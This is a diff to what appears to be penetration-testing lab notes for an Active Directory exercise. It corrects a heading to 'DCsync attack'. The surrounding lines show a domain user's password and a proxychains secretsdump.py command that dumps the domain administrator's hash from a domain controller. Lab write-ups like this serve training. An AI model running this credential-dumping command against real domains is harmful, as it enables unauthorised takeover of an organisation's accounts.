@@ -44,7 +44,7 @@ proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py INLANEFREIGH
          * Password : Sup3rS3cur3D0m@inU2eR
 
 
-### Get the final administrator's hash by dsync attack
+### Get the final administrator's hash by DCsync attack
 ```
 proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py INLANEFREIGHT/tpetty:"Sup3rS3cur3D0m@inU2eR"@172.16.6.3 -just-dc-user INLANEFREIGHT/administrator
 ```
